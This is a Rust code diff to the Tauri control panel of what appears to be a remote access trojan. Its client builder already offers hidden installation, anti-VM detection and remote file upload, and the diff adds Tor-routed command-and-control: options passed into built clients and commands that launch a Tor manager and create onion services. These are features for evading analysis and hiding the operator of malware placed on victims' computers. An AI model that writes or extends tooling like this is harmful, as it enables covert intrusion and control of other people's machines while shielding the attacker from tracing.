@@ -26,9 +26,10 @@ use common::packets::{
     VisitWebsiteData, FileData
 };
 use common::client_info::ClientInfo;
-use crate::utils::resources::{get_rcedit_path, get_client_built_exe_path};
+use crate::utils::resources::{get_rcedit_path, get_client_built_exe_path, get_exe_dir};
 
 use std::process::Command;
+use crate::utils::tor::{TorManager, OnionServiceInfo};
 
 pub async fn get_channel_tx(
     tauri_state: State<'_, SharedTauriState>,
@@ -210,6 +211,8 @@ pub async fn build_client(
     group: &str,
     enable_hidden: bool,
     anti_vm_detection: bool,
+    use_tor: bool,
+    tor_address: &str,
     app_handle: AppHandle,
 ) -> Result<String, String> {
     let log = Log {
@@ -232,6 +235,8 @@ pub async fn build_client(
         install_folder: install_folder.to_string(),
         enable_hidden,
         anti_vm_detection,
+        use_tor,
+        tor_address: tor_address.to_string(),
     };
 
     apply_config(&config).await?;
@@ -1015,6 +1020,35 @@ pub async fn upload_file_to_folder(
     send_server_command(ServerCommand::UploadFile(addr.parse().unwrap(), target_folder.to_string(), file_data), tauri_state, app_handle).await?;
 
     Ok("File upload command sent".to_string())
+}
+
+#[tauri::command]
+pub async fn init_tor(
+    tauri_state: State<'_, SharedTauriState>,
+) -> Result<Vec<OnionServiceInfo>, String> {
+    let mut state = tauri_state.0.lock().unwrap();
+    if state.tor_manager.is_none() {
+        let exe_dir = get_exe_dir().map_err(|e| e.to_string())?;
+        let tor_dir = exe_dir.join("tor_data");
+        let manager = TorManager::new(tor_dir).await.map_err(|e| e.to_string())?;
+        state.tor_manager = Some(Arc::new(manager));
+    }
+
+    Ok(state.tor_manager.as_ref().unwrap().get_services())
+}
+
+#[tauri::command]
+pub async fn create_onion(
+    nickname: String,
+    port: u16,
+    tauri_state: State<'_, SharedTauriState>,
+) -> Result<OnionServiceInfo, String> {
+    let manager = {
+        let state = tauri_state.0.lock().unwrap();
+        state.tor_manager.clone().ok_or("Tor manager not initialized")?
+    };
+
+    manager.create_onion_service(&nickname, port).await.map_err(|e| e.to_string())
 }
 
 #[tauri::command]
